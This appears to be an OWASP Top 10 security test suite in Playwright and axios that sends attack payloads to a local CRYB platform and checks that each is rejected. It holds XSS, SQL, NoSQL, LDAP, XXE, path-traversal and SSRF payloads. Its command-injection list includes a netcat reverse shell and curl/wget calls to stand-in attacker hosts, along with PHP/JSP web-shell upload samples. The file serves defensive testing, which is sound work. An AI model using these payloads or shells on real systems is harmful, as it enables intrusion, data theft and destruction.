// OWASP Top 10 Security Tests for CRYB Platform
const { test, expect } = require('@playwright/test');
const axios = require('axios');

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
const WEB_URL = process.env.WEB_URL || 'http://localhost:3001';

// Test data for security tests
const SECURITY_TEST_DATA = {
  xssPayloads: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '\'"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<object data="javascript:alert(\'XSS\')"></object>',
    '<embed src="javascript:alert(\'XSS\')">',
    '<link rel=import href="javascript:alert(\'XSS\')">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    '<form><button formaction=javascript:alert(\'XSS\')>XSS</button>',
    '<input type=image src=x:x onerror=alert(\'XSS\')>',
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror=alert(\'XSS\')>',
    '<details open ontoggle=alert(\'XSS\')>',
    '<marquee onstart=alert(\'XSS\')>',
  ],
  
  sqlInjectionPayloads: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' OR '1'='1' --",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    "' OR 1=1 #",
    "1' AND '1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
    "' OR 'a'='a",
    "1'; UPDATE users SET password='hacked' WHERE id=1; --",
    "' OR username LIKE '%admin%' --",
    "1' UNION ALL SELECT NULL,NULL,NULL,username,password FROM users --",
  ],
  
  commandInjectionPayloads: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "; wget http://malicious.com/shell.sh",
    "| nc -e /bin/sh attacker.com 4444",
    "; curl http://evil.com/$(whoami)",
    "&& ping -c 3 attacker.com",
    "; echo $USER",
    "| ps aux",
    "&& netstat -an",
  ],
  
  ldapInjectionPayloads: [
    "*)(&",
    "*)(uid=*",
    "*)|(objectClass=*",
    "*))%00",
    "*(|(password=*))",
    "*)(|(cn=*))",
  ],
  
  pathTraversalPayloads: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//....//....//....//etc/passwd",
    "/var/www/../../etc/passwd",
    "C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  ],
  
  nosqlInjectionPayloads: [
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "function() { return true; }"}',
    '{"$or": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}',
    '{"username": {"$regex": "admin"}}',
  ],
  
  xxePayloads: [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY example "Doe"><!ENTITY expandedentity "An entity containing another entity"><!ENTITY example2 SYSTEM "file:///etc/passwd">]><userInfo><firstName>John</firstName><lastName>&example2;</lastName></userInfo>',
  ],
  
  testCredentials: {
    username: 'testuser1',
    email: 'testuser1@example.com',
    password: 'TestPassword123!',
  },
  
  weakPasswords: [
    'password',
    '123456',
    'admin',
    'test',
    'qwerty',
    'password123',
    'admin123',
    '12345678',
    'letmein',
    'welcome',
  ],
};

describe('OWASP Top 10 Security Tests', () => {
  let authToken = '';
  
  test.beforeAll(async () => {
    // Get authentication token for authenticated tests
    try {
      const response = await axios.post(`${BASE_URL}/api/auth/login`, {
        email: SECURITY_TEST_DATA.testCredentials.email,
        password: SECURITY_TEST_DATA.testCredentials.password,
      });
      authToken = response.data.token;
    } catch (error) {
      console.warn('Could not authenticate for security tests:', error.message);
    }
  });

  describe('A01:2021 - Broken Access Control', () => {
    test('should prevent unauthorized access to admin endpoints', async () => {
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/stats',
        '/api/admin/reports',
        '/api/admin/moderation',
        '/api/admin/analytics',
      ];

      for (const endpoint of adminEndpoints) {
        try {
          const response = await axios.get(`${BASE_URL}${endpoint}`, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should not return 200 for non-admin users
          expect(response.status).not.toBe(200);
        } catch (error) {
          // Expecting 401, 403, or 404
          expect([401, 403, 404]).toContain(error.response?.status);
        }
      }
    });

    test('should prevent access to other users private data', async () => {
      if (!authToken) return;

      // Try to access another user's private data
      const sensitiveEndpoints = [
        '/api/users/2/private',
        '/api/users/admin/settings',
        '/api/notifications?userId=2',
      ];

      for (const endpoint of sensitiveEndpoints) {
        try {
          const response = await axios.get(`${BASE_URL}${endpoint}`, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should not allow access to other users' data
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([401, 403, 404]).toContain(error.response?.status);
        }
      }
    });

    test('should validate JWT token integrity', async () => {
      const manipulatedTokens = [
        'invalid.token.here',
        authToken.slice(0, -5) + 'AAAAA', // Modified signature
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.invalid',
      ];

      for (const token of manipulatedTokens) {
        try {
          const response = await axios.get(`${BASE_URL}/api/users/me`, {
            headers: { Authorization: `Bearer ${token}` },
          });
          
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([401, 403]).toContain(error.response?.status);
        }
      }
    });

    test('should prevent privilege escalation', async () => {
      if (!authToken) return;

      // Try to escalate privileges
      const escalationAttempts = [
        {
          endpoint: '/api/users/me',
          method: 'put',
          data: { role: 'admin', isAdmin: true },
        },
        {
          endpoint: '/api/communities/general/moderators',
          method: 'post',
          data: { action: 'add', userId: 'self' },
        },
      ];

      for (const attempt of escalationAttempts) {
        try {
          const response = await axios[attempt.method](`${BASE_URL}${attempt.endpoint}`, attempt.data, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should not allow privilege escalation
          if (response.status === 200 && response.data.role === 'admin') {
            throw new Error('Privilege escalation vulnerability detected');
          }
        } catch (error) {
          if (error.message?.includes('Privilege escalation')) {
            throw error;
          }
          // Expecting authorization error
          expect([401, 403, 400]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('A02:2021 - Cryptographic Failures', () => {
    test('should enforce HTTPS in production', async () => {
      // Check if HTTPS redirect is enforced
      if (process.env.NODE_ENV === 'production') {
        try {
          const response = await axios.get(BASE_URL.replace('https:', 'http:'), {
            maxRedirects: 0,
          });
          
          // Should redirect to HTTPS
          expect([301, 302]).toContain(response.status);
          expect(response.headers.location).toMatch(/^https:/);
        } catch (error) {
          // Expecting redirect
          expect([301, 302]).toContain(error.response?.status);
        }
      }
    });

    test('should use secure password hashing', async () => {
      // Attempt to register with a known password and verify it's hashed
      const testUser = {
        username: `securitytest_${Date.now()}`,
        email: `securitytest_${Date.now()}@example.com`,
        password: 'TestPassword123!',
      };

      try {
        const response = await axios.post(`${BASE_URL}/api/auth/register`, testUser);
        
        // Response should not contain password
        expect(response.data.user.password).toBeUndefined();
        expect(response.data.password).toBeUndefined();
        
        // Should contain token
        expect(response.data.token).toBeDefined();
      } catch (error) {
        // May fail if user already exists, which is fine
        if (error.response?.status !== 409) {
          throw error;
        }
      }
    });

    test('should generate secure session tokens', async () => {
      const tokens = [];
      
      // Generate multiple tokens
      for (let i = 0; i < 5; i++) {
        try {
          const response = await axios.post(`${BASE_URL}/api/auth/login`, {
            email: SECURITY_TEST_DATA.testCredentials.email,
            password: SECURITY_TEST_DATA.testCredentials.password,
          });
          
          if (response.data.token) {
            tokens.push(response.data.token);
          }
        } catch (error) {
          // Login may fail, continue
        }
      }
      
      // Tokens should be unique
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);
      
      // Tokens should be sufficiently long
      tokens.forEach(token => {
        expect(token.length).toBeGreaterThan(50);
      });
    });
  });

  describe('A03:2021 - Injection', () => {
    test('should prevent SQL injection in search', async () => {
      for (const payload of SECURITY_TEST_DATA.sqlInjectionPayloads) {
        try {
          const response = await axios.get(`${BASE_URL}/api/search`, {
            params: { q: payload },
            headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
          });
          
          // Should not return database error or unauthorized data
          expect(response.data.error).not.toMatch(/sql|database|syntax/i);
          
          if (response.data.users) {
            // Should not return all users or sensitive user data
            expect(response.data.users.length).toBeLessThan(1000);
            response.data.users.forEach(user => {
              expect(user.password).toBeUndefined();
              expect(user.email).toBeUndefined();
            });
          }
        } catch (error) {
          // Server errors are acceptable for malformed queries
          expect([400, 422, 500]).toContain(error.response?.status);
        }
      }
    });

    test('should prevent NoSQL injection', async () => {
      for (const payload of SECURITY_TEST_DATA.nosqlInjectionPayloads) {
        try {
          const response = await axios.post(`${BASE_URL}/api/auth/login`, {
            email: payload,
            password: payload,
          });
          
          // Should not successfully authenticate with injection
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([400, 401, 422]).toContain(error.response?.status);
        }
      }
    });

    test('should prevent command injection in file uploads', async () => {
      if (!authToken) return;

      for (const payload of SECURITY_TEST_DATA.commandInjectionPayloads) {
        try {
          const formData = new FormData();
          formData.append('file', new Blob(['test content']), `test${payload}.txt`);
          
          const response = await axios.post(`${BASE_URL}/api/uploads`, formData, {
            headers: {
              'Authorization': `Bearer ${authToken}`,
              'Content-Type': 'multipart/form-data',
            },
          });
          
          // Should sanitize filename
          if (response.data.filename) {
            expect(response.data.filename).not.toContain(';');
            expect(response.data.filename).not.toContain('|');
            expect(response.data.filename).not.toContain('&');
          }
        } catch (error) {
          // File upload may fail, which is acceptable
          expect([400, 413, 415, 422]).toContain(error.response?.status);
        }
      }
    });

    test('should prevent LDAP injection', async () => {
      for (const payload of SECURITY_TEST_DATA.ldapInjectionPayloads) {
        try {
          const response = await axios.post(`${BASE_URL}/api/auth/login`, {
            email: `user${payload}`,
            password: 'password',
          });
          
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([400, 401, 422]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('A04:2021 - Insecure Design', () => {
    test('should implement rate limiting', async () => {
      const requests = [];
      
      // Make rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(
          axios.post(`${BASE_URL}/api/auth/login`, {
            email: 'invalid@example.com',
            password: 'invalid',
          }).catch(error => error.response)
        );
      }
      
      const responses = await Promise.all(requests);
      
      // Should have rate limiting after several requests
      const rateLimited = responses.some(response => response?.status === 429);
      expect(rateLimited).toBe(true);
    });

    test('should prevent username enumeration', async () => {
      const existingUser = SECURITY_TEST_DATA.testCredentials.email;
      const nonExistentUser = 'nonexistent@example.com';
      
      try {
        const response1 = await axios.post(`${BASE_URL}/api/auth/forgot-password`, {
          email: existingUser,
        });
        
        const response2 = await axios.post(`${BASE_URL}/api/auth/forgot-password`, {
          email: nonExistentUser,
        });
        
        // Responses should be similar to prevent enumeration
        expect(response1.status).toBe(response2.status);
        expect(response1.data.message).toBe(response2.data.message);
      } catch (error) {
        // Both should fail similarly
      }
    });

    test('should validate business logic', async () => {
      if (!authToken) return;

      // Test invalid business operations
      const invalidOperations = [
        {
          description: 'negative vote count',
          endpoint: '/api/posts/test/vote',
          data: { direction: 'up', count: -5 },
        },
        {
          description: 'future date',
          endpoint: '/api/posts',
          data: {
            title: 'Future Post',
            content: 'Content',
            createdAt: new Date(Date.now() + 86400000).toISOString(),
          },
        },
      ];

      for (const operation of invalidOperations) {
        try {
          const response = await axios.post(`${BASE_URL}${operation.endpoint}`, operation.data, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should reject invalid business logic
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([400, 422]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('A05:2021 - Security Misconfiguration', () => {
    test('should not expose sensitive headers', async () => {
      try {
        const response = await axios.get(`${BASE_URL}/api/health`);
        
        // Should not expose sensitive server information
        expect(response.headers['server']).not.toMatch(/apache|nginx|express/i);
        expect(response.headers['x-powered-by']).toBeUndefined();
        expect(response.headers['x-aspnet-version']).toBeUndefined();
      } catch (error) {
        // Health endpoint may not exist
      }
    });

    test('should have security headers', async ({ page }) => {
      await page.goto(WEB_URL);
      
      const response = await page.waitForResponse(response => response.url().includes(WEB_URL));
      const headers = response.headers();
      
      // Should have security headers
      expect(headers['x-frame-options'] || headers['x-frame-options']).toBeDefined();
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-xss-protection']).toBeDefined();
      expect(headers['strict-transport-security']).toBeDefined();
    });

    test('should not expose debug information', async () => {
      try {
        const response = await axios.get(`${BASE_URL}/api/debug`);
        expect(response.status).not.toBe(200);
      } catch (error) {
        expect([404, 403]).toContain(error.response?.status);
      }
      
      // Test for common debug endpoints
      const debugEndpoints = [
        '/debug',
        '/api/debug',
        '/admin/debug',
        '/test',
        '/phpinfo.php',
        '/.env',
        '/config.php',
      ];
      
      for (const endpoint of debugEndpoints) {
        try {
          const response = await axios.get(`${BASE_URL}${endpoint}`);
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([404, 403]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('A06:2021 - Vulnerable Components', () => {
    test('should not expose version information', async () => {
      try {
        const response = await axios.get(`${BASE_URL}/package.json`);
        expect(response.status).not.toBe(200);
      } catch (error) {
        expect([404, 403]).toContain(error.response?.status);
      }
      
      // Test for common version disclosure files
      const versionFiles = [
        '/package.json',
        '/composer.json',
        '/requirements.txt',
        '/Gemfile',
        '/.git/config',
        '/node_modules',
      ];
      
      for (const file of versionFiles) {
        try {
          const response = await axios.get(`${BASE_URL}${file}`);
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([404, 403]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('A07:2021 - Identification and Authentication Failures', () => {
    test('should enforce strong password policy', async () => {
      for (const weakPassword of SECURITY_TEST_DATA.weakPasswords) {
        try {
          const response = await axios.post(`${BASE_URL}/api/auth/register`, {
            username: `weakpwdtest_${Date.now()}`,
            email: `weakpwdtest_${Date.now()}@example.com`,
            password: weakPassword,
          });
          
          // Should reject weak passwords
          expect(response.status).not.toBe(201);
        } catch (error) {
          expect([400, 422]).toContain(error.response?.status);
          expect(error.response?.data.error).toMatch(/password/i);
        }
      }
    });

    test('should implement account lockout', async () => {
      const attempts = [];
      
      // Make multiple failed login attempts
      for (let i = 0; i < 10; i++) {
        attempts.push(
          axios.post(`${BASE_URL}/api/auth/login`, {
            email: SECURITY_TEST_DATA.testCredentials.email,
            password: 'wrongpassword',
          }).catch(error => error.response)
        );
      }
      
      const responses = await Promise.all(attempts);
      
      // Should implement some form of protection (rate limiting or account lockout)
      const lastResponse = responses[responses.length - 1];
      expect([429, 423, 401]).toContain(lastResponse?.status);
    });

    test('should validate session management', async () => {
      if (!authToken) return;

      // Test session timeout
      try {
        const response = await axios.get(`${BASE_URL}/api/users/me`, {
          headers: { Authorization: `Bearer ${authToken}` },
        });
        
        expect(response.status).toBe(200);
        
        // Test token after logout
        await axios.post(`${BASE_URL}/api/auth/logout`, {}, {
          headers: { Authorization: `Bearer ${authToken}` },
        });
        
        // Token should be invalidated
        const postLogoutResponse = await axios.get(`${BASE_URL}/api/users/me`, {
          headers: { Authorization: `Bearer ${authToken}` },
        }).catch(error => error.response);
        
        expect([401, 403]).toContain(postLogoutResponse?.status);
      } catch (error) {
        // Initial request may fail
      }
    });
  });

  describe('A08:2021 - Software and Data Integrity Failures', () => {
    test('should validate file uploads', async () => {
      if (!authToken) return;

      const maliciousFiles = [
        { name: 'malicious.php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'malicious.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'malicious.exe', content: 'MZ\x90\x00' }, // PE header
      ];

      for (const file of maliciousFiles) {
        try {
          const formData = new FormData();
          formData.append('file', new Blob([file.content]), file.name);
          
          const response = await axios.post(`${BASE_URL}/api/uploads`, formData, {
            headers: {
              'Authorization': `Bearer ${authToken}`,
              'Content-Type': 'multipart/form-data',
            },
          });
          
          // Should reject malicious files
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([400, 413, 415, 422]).toContain(error.response?.status);
        }
      }
    });

    test('should validate content integrity', async () => {
      if (!authToken) return;

      // Test malicious content in posts
      for (const payload of SECURITY_TEST_DATA.xssPayloads.slice(0, 5)) {
        try {
          const response = await axios.post(`${BASE_URL}/api/posts`, {
            title: `XSS Test ${payload}`,
            content: `Test content with payload: ${payload}`,
            communityId: 'general',
          }, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          if (response.status === 201) {
            // Content should be sanitized
            expect(response.data.title).not.toContain('<script>');
            expect(response.data.content).not.toContain('<script>');
          }
        } catch (error) {
          // May reject malicious content
          expect([400, 422]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('A09:2021 - Security Logging and Monitoring Failures', () => {
    test('should log authentication attempts', async () => {
      // This test would typically check if failed login attempts are logged
      // Since we can't access logs directly, we verify the system responds appropriately
      
      try {
        await axios.post(`${BASE_URL}/api/auth/login`, {
          email: 'attacker@example.com',
          password: 'malicious',
        });
      } catch (error) {
        expect([401, 400]).toContain(error.response?.status);
      }
      
      // System should be able to handle the failed attempt without crashing
      const healthCheck = await axios.get(`${BASE_URL}/api/health`).catch(() => ({ status: 404 }));
      expect([200, 404]).toContain(healthCheck.status);
    });

    test('should handle malicious requests gracefully', async () => {
      const maliciousRequests = [
        { method: 'get', url: '/api/users/' + '../'.repeat(20) + 'etc/passwd' },
        { method: 'post', url: '/api/posts', data: { title: 'A'.repeat(10000) } },
        { method: 'get', url: '/api/search?q=' + 'x'.repeat(10000) },
      ];

      for (const request of maliciousRequests) {
        try {
          const response = await axios[request.method](`${BASE_URL}${request.url}`, request.data, {
            headers: authToken ? { Authorization: `Bearer ${authToken}` } : {},
          });
          
          // Should handle gracefully without exposing errors
          expect(response.status).toBeLessThan(500);
        } catch (error) {
          // Should return client error, not server error
          expect(error.response?.status).toBeLessThan(500);
        }
      }
    });
  });

  describe('A10:2021 - Server-Side Request Forgery (SSRF)', () => {
    test('should prevent SSRF in image uploads', async () => {
      if (!authToken) return;

      const ssrfPayloads = [
        'http://localhost:22',
        'http://127.0.0.1:3000/admin',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://internal.server/file',
      ];

      for (const payload of ssrfPayloads) {
        try {
          const response = await axios.post(`${BASE_URL}/api/uploads/from-url`, {
            url: payload,
          }, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should not fetch internal resources
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([400, 403, 422]).toContain(error.response?.status);
        }
      }
    });

    test('should validate webhook URLs', async () => {
      if (!authToken) return;

      const internalUrls = [
        'http://localhost:3000',
        'http://127.0.0.1:22',
        'http://192.168.1.1',
        'http://10.0.0.1',
      ];

      for (const url of internalUrls) {
        try {
          const response = await axios.post(`${BASE_URL}/api/webhooks`, {
            url: url,
            events: ['user.created'],
          }, {
            headers: { Authorization: `Bearer ${authToken}` },
          });
          
          // Should not allow internal URLs
          expect(response.status).not.toBe(201);
        } catch (error) {
          expect([400, 403, 422]).toContain(error.response?.status);
        }
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    test('should prevent stored XSS in user content', async ({ page }) => {
      if (!authToken) return;

      // Login to web interface
      await page.goto(`${WEB_URL}/login`);
      await page.fill('[data-testid="email-input"]', SECURITY_TEST_DATA.testCredentials.email);
      await page.fill('[data-testid="password-input"]', SECURITY_TEST_DATA.testCredentials.password);
      await page.click('[data-testid="login-button"]');

      // Try to create post with XSS payload
      for (const payload of SECURITY_TEST_DATA.xssPayloads.slice(0, 3)) {
        await page.goto(`${WEB_URL}/submit`);
        
        await page.fill('[data-testid="post-title-input"]', `XSS Test ${payload}`);
        await page.fill('[data-testid="post-content-input"]', `Content: ${payload}`);
        
        await page.click('[data-testid="submit-post-button"]');
        
        // XSS should not execute
        const dialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
        const dialog = await dialogPromise;
        
        expect(dialog).toBeNull(); // No alert should appear
        
        // Content should be escaped/sanitized
        const content = await page.textContent('body');
        expect(content).not.toContain('<script>');
      }
    });

    test('should prevent reflected XSS in search', async ({ page }) => {
      for (const payload of SECURITY_TEST_DATA.xssPayloads.slice(0, 3)) {
        await page.goto(`${WEB_URL}/search?q=${encodeURIComponent(payload)}`);
        
        // XSS should not execute
        const dialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
        const dialog = await dialogPromise;
        
        expect(dialog).toBeNull();
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should prevent path traversal in file access', async () => {
      for (const payload of SECURITY_TEST_DATA.pathTraversalPayloads) {
        try {
          const response = await axios.get(`${BASE_URL}/uploads/${payload}`);
          
          // Should not serve system files
          expect(response.status).not.toBe(200);
        } catch (error) {
          expect([404, 403, 400]).toContain(error.response?.status);
        }
      }
    });
  });
});